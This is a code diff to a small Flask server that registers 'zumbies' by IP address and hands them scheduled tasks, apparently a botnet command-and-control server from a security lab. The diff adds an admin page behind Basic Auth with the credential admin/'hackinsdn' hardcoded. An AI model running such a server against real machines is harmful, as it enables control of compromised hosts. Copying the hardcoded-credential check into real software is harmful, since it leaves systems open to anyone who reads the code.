@@ -1,4 +1,5 @@
 from flask import Flask, request, render_template
+from functools import wraps
 import datetime
 
 app = Flask(__name__, static_url_path='/s', static_folder='static')
@@ -6,15 +7,40 @@ zumbies = {}
 tasks = {}
 
 
+def check_auth(user, passwd):
+    return user == "admin" and passwd == "hackinsdn"
+
+
+def login_required(f):
+    @wraps(f)
+    def wrapped_view(**kwargs):
+        auth = request.authorization
+        if not (auth and check_auth(auth.username, auth.password)):
+            return ('Unauthorized', 401, {
+                'WWW-Authenticate': 'Basic realm="Login Required"'
+            })
+
+        return f(**kwargs)
+
+    return wrapped_view
+
+
 @app.route("/")
 def get_home():
     return render_template("index.html")
 
 
+@app.route("/admin")
+@login_required
+def get_admin():
+    return render_template("admin.html", zumbies=zumbies, tasks=tasks)
+
+
 @app.route("/register", methods=["POST"])
 def register_zumbi():
     global zumbies
-    zumbies[request.remote_addr] = request.get_json()
+    zumbies[request.remote_addr] = {}
+    zumbies[request.remote_addr]["_info"] = request.get_json()
     zumbies[request.remote_addr]["_tasks"] = {}
     return "OK"
 
@@ -48,7 +74,7 @@ def get_tasks():
     now = datetime.datetime.now().timestamp()
     zumbi = zumbies.get(request.remote_addr)
     if not zumbi:
-        zumbies[request.remote_addr] = {"_tasks": {}}
+        zumbies[request.remote_addr] = {"_tasks": {}, "_info": {}}
         zumbi = zumbies[request.remote_addr]
     for when, task in tasks.items():
         if when < now + 10:
@@ -61,4 +87,4 @@ def get_tasks():
 
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    app.run(host="0.0.0.0", port=5001)
